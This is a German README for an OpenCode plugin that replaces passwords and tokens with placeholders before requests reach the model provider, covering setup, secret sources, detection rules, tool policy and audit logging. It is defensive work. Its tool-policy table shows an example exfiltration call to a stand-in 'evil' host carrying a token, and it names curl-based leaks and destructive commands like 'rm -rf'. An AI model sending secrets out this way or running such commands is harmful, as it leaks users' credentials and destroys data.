# opencode-vibeguard-v2

**Secrets und Passwörter erreichen das LLM nur als Platzhalter – nie im Klartext.**

VibeGuard ist ein Plugin für **OpenCode V2** (getestet mit **2.0.32**, Windows/Bun-Runtime und Node 20+).
Es ersetzt Secrets, Passwörter, Tokens und andere sensible Werte durch Platzhalter wie
`__VG_DB_PASSWORD_xxxxxxxxxxxx__`, **bevor** eine Anfrage an den Modell-Provider geht, und setzt die
echten Werte lokal wieder ein – direkt vor der Ausführung eines Tools und im gestreamten Antworttext.

Ursprünglich portiert vom V1-Plugin [`opencode-vibeguard`](https://github.com/inkdust2021/opencode-vibeguard)
(MIT, inkdust2021). Keine Laufzeit-Abhängigkeiten, nur Node-Builtins.

```
Du / Dateien / Tools ─► [1 bekannte Secrets] ─► [3 strukturelle Ersetzung] ─► [4 Payload-Sicherheitsnetz] ─► Provider
                         [2 Muster + Entropie]                                                                │
Tool läuft mit echtem Wert ◄── [5 Tool-Richtlinie allow/ask/deny/keep] ◄── Platzhalter ◄──────────────────────┘
Antwort zeigt echten Wert  ◄── [6 Stream-Rückübersetzung]
Datei-Lesen blockiert      ◄── [7 Secret-Datei-Schutz]          Betrieb: /vibeguard · Audit-Log · Selbsttest
```

---

## Inhalt

1. [Schnellstart (Windows)](#schnellstart-windows)
2. [Wie es funktioniert – die Schutzschichten](#wie-es-funktioniert--die-schutzschichten)
3. [Bekannte Secrets pflegen](#bekannte-secrets-pflegen)
   - [Secrets-Datei](#secrets-datei)
   - [Windows Credential Manager](#windows-credential-manager)
   - [KeePass / KeePassXC](#keepass--keepassxc)
   - [Umgebungsvariablen, OpenCode-Zugangsdaten, Passwortmanager-Befehle](#weitere-quellen)
4. [Der Befehl `/vibeguard`](#der-befehl-vibeguard)
5. [Automatische Erkennung (Muster und Entropie)](#automatische-erkennung)
6. [Tool-Richtlinie: wer echte Werte bekommt](#tool-richtlinie-wer-echte-werte-bekommt)
7. [Secret-Dateien vor dem Lesen schützen](#secret-dateien-vor-dem-lesen-schützen)
8. [Audit-Log](#audit-log)
9. [Selbsttest und Live-Prüfung](#selbsttest-und-live-prüfung)
10. [Zusammen mit cc-safety-net](#zusammen-mit-cc-safety-net)
11. [Konfigurationsreferenz](#konfigurationsreferenz)
12. [Grenzen](#grenzen)
13. [Fehlersuche](#fehlersuche)
14. [Entwicklung](#entwicklung)

---

## Schnellstart (Windows)

**1. Plugin holen**

```powershell
mkdir $HOME\opencode-plugins -Force
cd $HOME\opencode-plugins
git clone -b opencode-2.0.32 https://github.com/olobarius/opencode-vibeguard-v2.git
```

**2. In OpenCode eintragen** – `~/.config/opencode/opencode.jsonc`:

```jsonc
{
  "$schema": "https://opencode.ai/config.json",
  "plugins": ["C:/Users/<du>/opencode-plugins/opencode-vibeguard-v2"]
}
```

**3. Konfiguration und Secrets-Liste anlegen**

```powershell
cd $HOME\opencode-plugins\opencode-vibeguard-v2
copy vibeguard.config.jsonc.example $HOME\.config\opencode\vibeguard.config.jsonc
copy vibeguard.secrets.example      $HOME\.config\opencode\vibeguard.secrets
notepad $HOME\.config\opencode\vibeguard.secrets     # eigene Passwörter/Tokens eintragen
```

**4. OpenCode neu starten** (`opencode service restart` oder Desktop-App neu starten).

**5. Prüfen** – in einer Session:

```
/vibeguard
```

Erwartet: `Self-test: ✅ passed` und deine Einträge mit maskierten Werten (`gh▒▒▒▒▒`).
Nach der ersten Modellanfrage zeigt der Status zusätzlich `live pipeline: ✅ verified`.

> Ohne Konfigurationsdatei ist das Plugin ein No-op und meldet laut `DISABLED`.
> Aktualisieren: `cd ...\opencode-vibeguard-v2; git pull`, danach OpenCode neu starten.

---

## Wie es funktioniert – die Schutzschichten

| # | Schicht | OpenCode-V2-Hook | Zweck |
|---|---------|------------------|-------|
| 1 | **Bekannte Secrets** | – | Exakte Werte aus Secrets-Datei, Windows Credential Manager, KeePass, Umgebungsvariablen, OpenCodes `auth.json`, Passwortmanager-Befehlen und geschützten Dateien – inklusive Base64-, Base64url- und URL-kodierter Varianten. Benannte, über Neustarts stabile Platzhalter. **Zuverlässigste Schicht.** |
| 2 | **Muster + Entropie** | – | 40+ Token-Formate (OpenAI `sk-proj-…`, Anthropic, GitHub, AWS, Slack, Stripe, JWT, …), komplette Private-Key-Blöcke, Passwörter in URLs, `Authorization`-Header, `password = …`-Zuweisungen und **zufällig aussehende Werte neben Schlüsselnamen** (Entropie). Optional PII (IBAN, Kreditkarte, E-Mail, …). |
| 3 | **Strukturelle Ersetzung** | `session.hook("context" \| "compaction" \| "generate" \| "title")` | System-Prompt, Text-, Reasoning- und Compaction-Teile, Tool-Aufrufe und Tool-Ergebnisse (als Kopie, ohne den Session-Zustand zu verändern), Text-Anhänge. Fügt einen kurzen Hinweis für das Modell hinzu, wie Platzhalter zu behandeln sind. |
| 4 | **Payload-Sicherheitsnetz** | `session.hook("http.request")`, `experimental.ws.send` | Prüft die fertige Provider-Anfrage noch einmal auf bekannte Werte (auch JSON-escaped) und eindeutige Token-Formate. Modus `redact` (ersetzen) oder `block` (Anfrage abbrechen). |
| 5 | **Tool-Richtlinie** | `tool.hook("execute.before")` | Setzt echte Werte für lokale Tools ein. Pro Tool `allow`/`ask`/`deny`/`keep` – verhindert z. B. `webfetch("https://evil/?k=<Token>")`. Erfundene Platzhalter lassen den Aufruf fehlschlagen statt sie in Dateien zu schreiben. |
| 6 | **Stream-Rückübersetzung** | `session.hook("http.response")`, `experimental.ws.receive` | Ersetzt Platzhalter im gestreamten **Antworttext** (OpenAI Chat/Responses, Anthropic, Gemini) durch die echten Werte – auch wenn ein Platzhalter über mehrere Stream-Stücke verteilt ankommt. Tool-Argumente und Reasoning bleiben unverändert. |
| 7 | **Secret-Datei-Schutz** | `permission.hook("evaluate")` | Verweigert `read` auf registrierte Secret-Dateien und fragt bei Shell-Befehlen nach, die sie erwähnen. |
| – | Prompt-Ersetzung (optional) | `session.hook("prompt")` | `redact_prompt: true` speichert auch deinen eingegebenen Prompt nur mit Platzhaltern. |
| – | **Betrieb** | `command.transform`, Plugin-Storage | `/vibeguard`-Befehl, JSONL-Audit-Log, Selbsttest beim Start, Live-Prüfung der Hook-Kette. |

**Fail-closed:** Schlägt die Ersetzung fehl oder fällt der Selbsttest durch, wird die Anfrage blockiert
statt unverschlüsselt gesendet (`fail_closed: true`, Standard).

### Platzhalter

```
__VG_<NAME>_<hash12>__        z. B.  __VG_GITHUB_PAT_xxxxxxxxxxxx__   (x = 12 Hex-Zeichen)
```

- **Bekannte Secrets** bekommen ihren Namen aus der Quelle (`DB_PASSWORD=…` → `__VG_DB_PASSWORD_…__`).
  Der Hash stammt aus einem Installationsschlüssel im Plugin-Storage – derselbe Wert hat **immer** denselben
  Platzhalter, über Sessions und Neustarts hinweg, und ist damit auch nach einer Compaction rückübersetzbar.
- **Erkannte Werte** bekommen die Kategorie der Regel (`__VG_GITHUB_TOKEN_…__`, `__VG_HIGH_ENTROPY_SECRET_…__`)
  und einen pro Session stabilen Hash. Gültigkeit: gleitend `session.ttl` (Standard 24 h ab letzter Nutzung).

---

## Bekannte Secrets pflegen

Mustererkennung kann dein WLAN-Passwort, einen Kundennamen oder einen nackten Hex-Token nicht kennen.
**Alles, was wirklich wichtig ist, gehört in eine der folgenden Quellen.** Werte daraus werden exakt
gefunden – überall, auch Base64- und URL-kodiert (z. B. in `Authorization: Basic …` oder
`kubectl get secret -o yaml`).

### Secrets-Datei

Standardorte (beide werden gelesen):

- global: `~/.config/opencode/vibeguard.secrets`
- pro Projekt: `<projekt>/.opencode/vibeguard.secrets`

Format (dotenv-artig):

```dotenv
# Kommentar
GITHUB_PAT=github_pat_11AB...           # NAME=Wert  → __VG_GITHUB_PAT_…__
export AWS_SECRET=wJalrXUtnFEMI/...     # "export" ist erlaubt
DB_PASSWORD="P@ss word #1"              # Werte mit Leerzeichen oder " #" in Anführungszeichen
CUSTOMER_NAME="Acme Rocket Corp"        # auch Namen/Begriffe, nicht nur Passwörter
mein-altes-wlan-passwort                # nackte Zeile → __VG_SECRET_…__
```

- Mindestlänge `secrets.min_len` (Standard 4). Platzhalterwörter wie `changeme`, `xxx`, `true` werden ignoriert.
- Die Datei wird **automatisch neu geladen** (`secrets.reload_interval`, Standard 5 s) – kein Neustart nötig.
- Das Modell darf sie **nicht lesen** (Schicht 7), und `/vibeguard add` schreibt in die erste Datei.
- Andere Pfade: `secrets.files` in der Konfiguration.

> Die Datei enthält Klartext. Lege sie nicht in ein Git-Repository. Wer das vermeiden möchte, nutzt den
> Windows Credential Manager oder KeePass.

### Windows Credential Manager

Standardmäßig aktiv (nur Windows): Jede **generische Anmeldeinformation** mit dem Namen
`vibeguard:<NAME>` wird als bekanntes Secret `__VG_<NAME>_…__` geladen. Die Werte liegen
DPAPI-verschlüsselt im Windows-Tresor, nicht in einer Datei.

**Anlegen** – am einfachsten mit dem Befehl (Wert aus der Zwischenablage):

```
/vibeguard add DB_PASSWORD --wincred
```

oder in PowerShell / über die Systemsteuerung (*Anmeldeinformationsverwaltung → Windows-Anmeldeinformationen →
Generische Anmeldeinformation hinzufügen*, Internet- oder Netzwerkadresse `vibeguard:DB_PASSWORD`):

```powershell
cmdkey /generic:vibeguard:DB_PASSWORD /user:vibeguard /pass
```

**Weitere vorhandene Einträge einbinden**, z. B. das Git-Credential-Manager-Token:

```jsonc
"secrets": {
  "windows_credentials": [
    { "filter": "vibeguard:*" },                                          // Standard
    { "target": "git:https://github.com", "name": "GITHUB_GCM" },         // ein bestimmter Eintrag
    { "filter": "MyCompany/*", "include_user": true }                     // Präfix; Benutzername ebenfalls schützen
  ]
}
```

- `filter` mit `*` am Ende: Präfix, der Name ist der Rest des Zielnamens.
- `target`: genau ein Eintrag; `name` legt den Platzhalternamen fest.
- `/vibeguard add NAME` schreibt standardmäßig in die Datei; mit `"store": "wincred"` immer in den Credential Manager.
- Der Credential Manager wird beim Start und bei `/vibeguard reload` gelesen (nicht alle 5 s).
- Abschalten: `"windows_credentials": []`.

### KeePass / KeePassXC

Benötigt [`keepassxc-cli`](https://keepassxc.org/) (liegt KeePassXC bei; unter Windows z. B.
`C:\Program Files\KeePassXC\keepassxc-cli.exe`). Funktioniert mit `.kdbx`-Dateien von KeePass 2 und KeePassXC.

```jsonc
"secrets": {
  "keepass": {
    "database": "~/Documents/secrets.kdbx",
    "cli": "C:/Program Files/KeePassXC/keepassxc-cli.exe",   // optional, falls nicht im PATH
    // Master-Passwort – NIE in die Konfiguration schreiben. Genau eine der Optionen:
    "password_wincred": "vibeguard-keepass",   // aus dem Windows Credential Manager (empfohlen)
    // "password_env": "KEEPASS_PASSWORD",     // aus einer Umgebungsvariable
    // "no_password": true,                    // nur Schlüsseldatei
    "key_file": "~/keys/secrets.keyx",         // optional
    "group": "VibeGuard",                      // alle Einträge dieser Gruppe (Titel = Name)
    "entries": [                               // und/oder einzelne Einträge
      { "name": "DB_PASSWORD", "entry": "Dev/Database" },
      { "name": "VPN_USER", "entry": "Work/VPN", "attribute": "UserName" }
    ]
  }
}
```

Master-Passwort für `password_wincred` hinterlegen (der Name muss mit `password_wincred` übereinstimmen):

```powershell
cmdkey /generic:vibeguard-keepass /user:keepass /pass
```

- Das Passwort wird `keepassxc-cli` über stdin übergeben, nie über die Kommandozeile.
- Die Datenbankdatei wird zusätzlich vor dem Lesen durch das Modell geschützt.
- Gelesen beim Start und bei `/vibeguard reload`.

### Weitere Quellen

| Quelle | Schalter | Beschreibung |
|---|---|---|
| Umgebungsvariablen | `secrets.env` (Standard `true`) | Werte von Variablen mit sensiblen Namen (`*_TOKEN`, `*_SECRET`, `*PASSWORD*`, `*_API_KEY`, `DATABASE_URL`, …) im OpenCode-Prozess. Feinsteuerung: `{ "include": ["MYAPP_*"], "exclude": ["CI_*"], "min_len": 8 }`. |
| OpenCode-Zugangsdaten | `secrets.opencode_auth` (Standard `true`) | Provider-API-Keys und OAuth-Tokens aus `~/.local/share/opencode/auth.json` und `mcp-auth.json`. Diese Dateien und `opencode.db` werden außerdem vor dem Lesen geschützt. |
| Passwortmanager-Befehle | `secrets.commands` | Beliebige Befehle, erste Ausgabezeile ist das Secret: `{ "name": "GITHUB_PAT", "command": ["pass", "show", "github/token"] }`, `["op", "read", "op://Private/GitHub/token"]`, `["powershell", "-NoProfile", "-Command", "Get-Secret -Name X -AsPlainText"]`. |
| Geschützte Dateien | `patterns.protected_files` | Inhalte beliebiger Dateien (`.env`, Token-Dateien, YAML) werden zu bekannten Secrets. |
| cc-safety-net-Sperrliste | `patterns.import_deny_paths` | Alle Dateien aus `secret_protection.deny_paths` in `~/.cc-safety-net/policy.json` (siehe [unten](#zusammen-mit-cc-safety-net)). |
| Feste Begriffe | `patterns.keywords` | `{ "value": "Project Bluebird", "category": "CODENAME", "ignore_case": true, "whole_word": true }` – auch ohne Groß-/Kleinschreibung. |

---

## Der Befehl `/vibeguard`

In jeder Session verfügbar. Die Ausgabe erscheint als Nachricht in der Session, **ohne dass das Modell
aufgerufen wird**. Werte werden **nie** angezeigt – nur maskiert (`gh▒▒▒▒▒`, Werte unter 16 Zeichen
vollständig `▒▒▒▒▒`) mit Länge und Quelle.

| Befehl | Wirkung |
|---|---|
| `/vibeguard` oder `/vibeguard status` | Status: Konfiguration, Selbsttest, Live-Prüfung, Quellen, Regeln, geschützte Pfade, Audit-Log-Pfad und die Liste der bekannten Secrets (maskiert). |
| `/vibeguard add NAME` | Fügt den Inhalt der **Zwischenablage** als Secret `NAME` hinzu. Empfohlen: Der Wert wird nie in den Chat getippt. |
| `/vibeguard add NAME=Wert` | Fügt einen eingetippten Wert hinzu. Er wird ab sofort in jeder Anfrage ersetzt (auch in dieser Befehlszeile selbst). |
| `/vibeguard add NAME --wincred` | Speichert im Windows Credential Manager (`vibeguard:NAME`) statt in der Datei. `--file` erzwingt die Datei. |
| `/vibeguard remove NAME` | Entfernt `NAME` aus der Secrets-Datei und dem Credential Manager. |
| `/vibeguard reload` | Liest alle Quellen neu, auch Credential Manager, KeePass und Passwortmanager-Befehle. |
| `/vibeguard test` | Führt den Selbsttest aus und zeigt jedes Prüfergebnis. |
| `/vibeguard audit [n]` | Zeigt die letzten `n` Audit-Ereignisse (Standard 20, max. 200). |
| `/vibeguard help` | Übersicht. |

Typischer Ablauf, um ein neues Passwort zu schützen:

1. Passwort in die Zwischenablage kopieren.
2. `/vibeguard add VPN_PASSWORD` eingeben.
3. Ab jetzt sieht das Modell überall nur noch `__VG_VPN_PASSWORD_…__`.

Hinweise:

- Die Ausgabe des Befehls wird mit dem nächsten Turn Teil der Unterhaltung. Deshalb enthält sie nur Namen,
  Längen und maximal zwei Anfangszeichen (`command.mask_chars`, `0` = komplett maskiert).
- Name des Befehls: `command.name`; abschalten: `"command": { "enabled": false }`.

---

## Automatische Erkennung

Gruppe `secrets` (Standard, wenn `patterns.builtin` fehlt):

| Regel | Erkennt |
|---|---|
| `private_key`, `putty_key`, `age_key` | Komplette Schlüsselblöcke (`-----BEGIN … PRIVATE KEY-----` … `END`), PuTTY, age |
| `openai_key`, `anthropic_key`, `openrouter_key`, `ai_keys` | `sk-proj-…`, `sk-ant-…`, `sk-or-v1-…`, Groq, xAI, Perplexity, Replicate, LangSmith, Tavily, Hugging Face |
| `github_token`, `gitlab_token` | `ghp_/gho_/ghu_/ghs_/ghr_…`, `github_pat_…`, `glpat-…` und weitere GitLab-Typen |
| `aws_access_key`, `aws_secret`, `azure_*`, `google_*` | AWS-Schlüssel, Azure Storage/SAS/AD-Secrets, Google API/OAuth |
| `slack_*`, `discord_webhook`, `teams_webhook`, `telegram_bot` | Chat-Tokens und Webhooks |
| `stripe_key`, `sendgrid_key`, `mailgun_key`, `twilio_key`, `npm_token`, `pypi_token`, `docker_token`, `digitalocean_token`, `shopify_token`, `databricks_token`, `atlassian_token`, `linear_key`, `notion_token`, `supabase_key`, `vault_token`, `sentry_dsn` | Dienst-spezifische Tokens |
| `jwt` | JSON Web Tokens |
| `url_credentials` | Passwort in URLs (`postgres://user:PASSWORT@host`) – nur das Passwort wird ersetzt |
| `auth_header`, `bearer_token` | `Authorization: Bearer/Basic/Token …` |
| `generic_secret` | `password = "…"`, `api_key: …`, `client_secret=…` – nur der **Wert**, mit Filtern gegen Code (`password: string`, `os.environ[...]`, `${VAR}`, `<your-key>` …) |
| `entropy_secret` | **Entropie-Erkennung**, siehe unten |

Optionale PII-Regeln (zusätzlich in `builtin` angeben): `iban` (mit Prüfsumme), `credit_card`
(Luhn + gültiges Kartenpräfix, damit Zeitstempel nicht anschlagen), `email`, `uuid`, `ipv4`, `mac`,
`china_phone`, `china_id`, `stripe_publishable`. `"all"` aktiviert alles.

```jsonc
"patterns": { "builtin": ["secrets", "iban", "credit_card"] }
```

### Entropie-Erkennung

Die Regel `entropy_secret` findet Secrets **ohne bekanntes Format** – aber nur, wenn **beides** zutrifft:

1. **Schlüsselname in der Nähe**, der nach Secret klingt: enthält `key`, `auth`, `sig`/`signature`, `pass`, `pwd`,
   `cred`, `secret`, `token`, `license`, `private`, `salt`, `cookie` oder `bearer` – als Zuweisung
   (`stripeKey: …`, `X-Auth = …`) oder als Kommandozeilen-Option (`--token …`).
2. **Der Wert sieht zufällig aus:**
   - mindestens 16 Zeichen (`min_len`),
   - Shannon-Entropie ≥ 3,5 Bit/Zeichen (`min_bits`), bei reinem Hex ≥ 3,0 und mindestens 32 Zeichen (`min_hex_bits`),
   - enthält Ziffern und mindestens zwei Zeichenklassen,
   - ist kein Pfad, kein Dateiname, keine UUID, keine Zahl, kein Bezeichner aus Wörtern
     (`user_profile_settings_id`) und keine Variablenreferenz.

Treffer werden als `__VG_HIGH_ENTROPY_SECRET_…__` ersetzt. Schwellen anpassen:

```jsonc
"patterns": { "entropy": { "min_bits": 3.8, "min_hex_bits": 3.2, "min_len": 20 } }
```

Abschalten: `"builtin"` explizit ohne `entropy_secret` angeben – dann aber die gewünschten Regeln einzeln
aufzählen, da `"secrets"` die Entropie-Regel enthält. Einzelne Fehltreffer: `patterns.exclude`.

### Eigene Regeln

```jsonc
"patterns": {
  "regex": [
    { "pattern": "ACME-[0-9]{8}", "category": "ACME_ID" },
    { "pattern": "license=(?<secret>[A-Z0-9]{20})", "category": "LICENSE" }   // nur die Gruppe ersetzen
  ],
  "exclude": ["localhost", "127.0.0.1", "mein-öffentlicher-test-key"]
}
```

Ungültige Regeln werden übersprungen und im Selbsttest als Warnung gemeldet.

---

## Tool-Richtlinie: wer echte Werte bekommt

Bevor ein Tool läuft, ersetzt VibeGuard die Platzhalter in seinen Argumenten durch die echten Werte –
**aber nur, wenn die Richtlinie es erlaubt.** Die erste passende Regel gewinnt.

```jsonc
"restore": {
  "tools": {
    "execute": "keep",          // Code Mode: Platzhalter bleiben; die darin aufgerufenen Tools entscheiden einzeln
    "webfetch": "ask",          // Rückfrage (einmal pro Session und Tool)
    "websearch": "deny",        // Aufruf schlägt mit Erklärung fehl
    "chrome-devtools_*": "ask", // MCP-Tools heißen <server>_<tool>, Wildcards erlaubt
    "exchange_*": "ask",
    "*": "allow"                // alles andere (shell, write, edit, …) bekommt echte Werte
  },
  "unknown": "error"            // Platzhalter, die es nicht gibt (vom Modell erfunden) → Fehler statt Datei mit Müll
}
```

| Wirkung | Bedeutung |
|---|---|
| `allow` | Echte Werte einsetzen. |
| `ask` | OpenCode-Rückfrage `vibeguard_secret` mit den betroffenen Namen; nach Zustimmung einmal pro Session und Tool erlaubt. |
| `deny` | Aufruf wird abgelehnt; das Modell erhält eine Erklärung. |
| `keep` | Tool läuft mit den Platzhaltern (unverändert). |

Ein eigenes `tools`-Objekt **ersetzt** die Standardregeln – daher immer mit `"*"` abschließen.

---

## Secret-Dateien vor dem Lesen schützen

Alle registrierten Secret-Dateien – Secrets-Dateien, `protected_files`, Dateien aus der cc-safety-net-Sperrliste,
OpenCodes `auth.json`/`mcp-auth.json`/`opencode.db`, die KeePass-Datenbank und `protect.paths` – sind geschützt:

- `read` auf diese Dateien wird **verweigert** (`protect.reads: true`).
- Shell-Befehle, die sie erwähnen, lösen eine **Rückfrage** aus (`protect.shell: "ask"`, oder `"deny"` / `"off"`).

```jsonc
"protect": { "reads": true, "shell": "ask", "paths": ["~/.ssh", "C:/secrets"] }
```

Für umfassenden Schutz (`.env`, `~/.ssh`, `~/.aws`, Zertifikate, Base64-verschleierte Pfade …) zusätzlich
[cc-safety-net](#zusammen-mit-cc-safety-net) verwenden.

---

## Audit-Log

Sicherheitsrelevante Ereignisse werden als JSON-Zeilen protokolliert – **niemals Werte**, nur Typ, Anzahl,
Kategorien/Namen, Tool, Session-ID und Pfade.

- Standardpfad: `~/.local/share/opencode/vibeguard/audit.jsonl`
- Rotation: bei `max_bytes` (Standard 5 MiB) → `audit.jsonl.1`, `.2` …, höchstens `max_files` (Standard 3) Dateien.
- Schreibfehler blockieren nie eine Anfrage.
- Anzeigen: `/vibeguard audit 50` oder `Get-Content ~\.local\share\opencode\vibeguard\audit.jsonl -Tail 20`

Beispiel:

```json
{"schema_version":1,"ts":"2026-10-17T13:08:51.338Z","type":"redact","session":"ses_…","kind":"context","count":3,"categories":["GITHUB_PAT","DB_PASSWORD"]}
{"schema_version":1,"ts":"2026-10-17T13:09:02.101Z","type":"tool.deny","session":"ses_…","tool":"websearch","categories":["GITHUB_PAT"]}
```

| Ereignis | Bedeutung |
|---|---|
| `active`, `load`, `selftest` | Plugin gestartet, Quellen geladen (Anzahl pro Quelle, unlesbare Quellen), Selbsttest-Ergebnis |
| `pipeline` | Live-Prüfung: die strukturelle Ersetzung lief für die erste Anfrage einer Session |
| `redact`, `redact.prompt` | Werte vor einer Anfrage ersetzt |
| `guard`, `guard.ws` | Sicherheitsnetz hat etwas gefunden, das die strukturelle Ersetzung übersehen hat (mit JSON-`paths`) |
| `tool.restore`, `tool.ask`, `tool.deny`, `tool.unknown_placeholder` | Entscheidungen der Tool-Richtlinie |
| `protect.read`, `protect.shell` | Zugriff auf Secret-Datei blockiert bzw. nachgefragt |
| `request.blocked`, `redact.error`, `guard.error`, `restore.error` | Fehler; bei `fail_closed` wurde die Anfrage blockiert |
| `command`, `command.add`, `command.remove`, `command.error` | `/vibeguard`-Nutzung |

```jsonc
"audit": { "enabled": true, "path": "", "max_bytes": 5242880, "max_files": 3 }
```

---

## Selbsttest und Live-Prüfung

**Beim Start** prüft VibeGuard die ganze Kette mit **zufälligen Canary-Werten** (nie echte Secrets):

1. bekannter Wert wird ersetzt,
2. Platzhalter wird korrekt rückübersetzt,
3. erneutes Ersetzen verändert nichts (idempotent),
4. ein GitHub-Token wird von den Regeln erkannt,
5. das Payload-Sicherheitsnetz findet den Wert auch JSON-escaped,
6. die Stream-Rückübersetzung setzt einen in zwei Stücke geteilten Platzhalter korrekt zusammen,
7. Regeln und Tool-Richtlinie sind gültig (nur Warnungen).

Schlägt ein Pflichttest fehl, werden Modellanfragen blockiert, solange `fail_closed` aktiv ist –
lieber kein Request als ein ungeschützter. Ergebnis: `/vibeguard status`, `/vibeguard test`, Audit-Ereignis `selftest`.

**Live-Prüfung:** Bei der ersten Agenten-Anfrage jeder Session kontrolliert das Sicherheitsnetz, ob die
strukturelle Ersetzung tatsächlich gelaufen ist (am Hinweistext im System-Prompt). Ergebnis im Status
(`live pipeline: ✅ verified`) und als Audit-Ereignis `pipeline`.

```jsonc
"selftest": true
```

---

## Zusammen mit cc-safety-net

[cc-safety-net](https://github.com/kenryu42/cc-safety-net) blockiert zerstörerische Befehle
(`git reset --hard`, `rm -rf`, `push --force` …) und Zugriffe auf Secret-Dateien durch statische Analyse von
Shell-Befehlen (PowerShell und POSIX) und Tool-Aufrufen. Es unterstützt die OpenCode-V2-Plugin-API nativ.

Beide ergänzen sich:

- **cc-safety-net** verhindert, dass Secrets überhaupt in die Session gelangen.
- **VibeGuard** verhindert, dass etwas, das trotzdem hineingelangt ist, den Provider erreicht.

**Installation** (OpenCode ≥ 2.0.6, `opencode` muss im `PATH` sein):

```powershell
# Einmalig, falls npm/npx in PowerShell blockiert sind:
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned

npx -y cc-safety-net@latest install --opencode
npx -y cc-safety-net@latest doctor
```

Die Desktop-App legt die CLI unter `%APPDATA%\ai.opencode.desktop\cli\<version>\opencode-cli.exe` ab. Ist
`opencode` nicht im `PATH`, vorübergehend eine Kopie oder einen Hardlink namens `opencode.exe` in einen
PATH-Ordner legen.

**Sperrliste teilen:** Mit `"import_deny_paths": true` werden alle Dateien aus
`secret_protection.deny_paths` in `~/.cc-safety-net/policy.json` auch für VibeGuard zu bekannten Secrets und
vor dem Lesen geschützt. Pflege mit dem mitgelieferten Skript (funktioniert auch ohne cc-safety-net):

```powershell
node scripts/add-deny-path.mjs --init                                   # leere policy.json anlegen
node scripts/add-deny-path.mjs C:\Users\<du>\.config\opencode\vibeguard.secrets
node scripts/add-deny-path.mjs list
```

---

## Konfigurationsreferenz

Suchreihenfolge (erste gefundene Datei gewinnt):

1. `$OPENCODE_VIBEGUARD_CONFIG`
2. `<projekt>/vibeguard.config.json(c)`
3. `<projekt>/.opencode/vibeguard.config.json(c)`
4. `~/.config/opencode/vibeguard.config.json(c)`

JSONC (Kommentare, abschließende Kommas) und UTF-8 mit BOM werden akzeptiert. Plugin-Optionen aus
`opencode.jsonc` (`{ "package": "…", "options": { … } }`) werden darübergelegt.

Vollständig kommentierte Vorlage: [`vibeguard.config.jsonc.example`](vibeguard.config.jsonc.example).

| Schlüssel | Standard | Beschreibung |
|---|---|---|
| `enabled` | `false` | Muss `true` sein. |
| `debug` | `false` | Zusätzliches Trace in `%TEMP%\opencode-vibeguard-trace.log` (nur Zählwerte) und JSON-Pfade bei Sicherheitsnetz-Treffern. |
| `placeholder_prefix` | `"__VG_"` | Präfix der Platzhalter. |
| `fail_closed` | `true` | Bei Fehlern/fehlgeschlagenem Selbsttest Anfrage blockieren. |
| `system_hint` | `true` | Hinweis für das Modell zum Umgang mit Platzhaltern (auch Grundlage der Live-Prüfung). |
| `redact_prompt` | `false` | Eingegebenen Prompt schon beim Speichern ersetzen. |
| `session.ttl` / `max_mappings` / `max_sessions` | `24h` / `100000` / `100` | Lebensdauer (gleitend) und Grenzen für erkannte Werte. |
| `secrets.files` | global + Projekt | Secrets-Dateien. |
| `secrets.env` | `true` | Umgebungsvariablen (oder `{ include, exclude, min_len }`). |
| `secrets.opencode_auth` | `true` | OpenCode-Zugangsdaten. |
| `secrets.windows_credentials` | `[{ "filter": "vibeguard:*" }]` | Windows Credential Manager. |
| `secrets.keepass` | `null` | KeePass-Anbindung. |
| `secrets.commands` | `[]` | Passwortmanager-Befehle. |
| `secrets.store` | `"file"` | Ziel von `/vibeguard add`: `file` oder `wincred`. |
| `secrets.variants` | `true` | Base64/URL-Varianten. |
| `secrets.min_len` | `4` | Mindestlänge für Secrets-Dateien. |
| `secrets.reload_interval` | `"5s"` | Prüfintervall für Datei-Änderungen. |
| `patterns.builtin` | `["secrets"]` | Regelgruppen/-namen. |
| `patterns.entropy` | `3.5 / 3.0 / 16` | Entropie-Schwellen. |
| `patterns.keywords` / `regex` / `exclude` | `[]` | Eigene Begriffe, Regeln, Ausnahmen. |
| `patterns.protected_files` / `import_deny_paths` / `deny_policy` | `[]` / `false` / `""` | Dateiinhalte als Secrets, cc-safety-net-Sperrliste. |
| `guard.http` | `"redact"` | Sicherheitsnetz: `redact`, `block`, `off`. |
| `guard.websocket` / `guard.regex` | `true` / `"strong"` | WebSocket-Frames; Regelumfang im Sicherheitsnetz (`strong`, `all`, `off`). |
| `restore.response` | `true` | Antworttext rückübersetzen. |
| `restore.tools` | siehe oben | Tool-Richtlinie. |
| `restore.unknown` | `"error"` | Unbekannte Platzhalter: `error` oder `keep`. |
| `protect.reads` / `shell` / `paths` | `true` / `"ask"` / `[]` | Secret-Datei-Schutz. |
| `audit.enabled` / `path` / `max_bytes` / `max_files` | `true` / Standardpfad / 5 MiB / 3 | Audit-Log. |
| `selftest` | `true` | Selbsttest beim Start. |
| `command.enabled` / `name` / `mask_chars` | `true` / `"vibeguard"` / `2` | Slash-Befehl. |

---

## Grenzen

- Die Ersetzung ist textbasiert. **Bilder und PDFs** werden nicht untersucht (Text-Anhänge schon).
- Die Erkennung **unbekannter** Secrets ist heuristisch. Wichtiges gehört in die Secrets-Datei, den
  Credential Manager oder KeePass.
- Was du **selbst in den Chat tippst**, liegt im lokalen Transcript (`opencode.db`) im Klartext –
  außer mit `redact_prompt: true`. Das LLM sieht es trotzdem nur als Platzhalter.
  Am besten Secrets per `/vibeguard add NAME` aus der Zwischenablage registrieren.
- Tool-Argumente im Transcript zeigen Platzhalter (die Richtlinie entscheidet bei der Ausführung).
  Das Reasoning des Modells behält Platzhalter, weil Provider es über Metadaten zurückschicken und teils signieren.
- Plugins, die selbst `ctx.generate.text` aufrufen, umgehen die Session-Hooks; deren Anfragen werden nicht ersetzt.
- Ein Modell kann theoretisch versuchen, ein Secret über ein erlaubtes Tool zu exfiltrieren (z. B. `shell` mit
  `curl`). Dagegen helfen die Tool-Richtlinie, OpenCode-Berechtigungen und cc-safety-net.

---

## Fehlersuche

| Symptom | Lösung |
|---|---|
| `DISABLED: no vibeguard.config.json(c) found` | Konfiguration anlegen (Schnellstart Schritt 3), `"enabled": true`. |
| `/vibeguard` unbekannt | Plugin-Pfad in `opencode.jsonc` prüfen, OpenCode neu starten; `opencode api plugin.list` muss `opencode-vibeguard … active` zeigen. |
| Selbsttest ❌ | `/vibeguard test` zeigt die fehlgeschlagene Prüfung. Häufig: ungültige eigene Regex. |
| `live pipeline: ❌` | Ein anderes Plugin verändert die Anfrage nach VibeGuard, oder `system_hint` ist aus. |
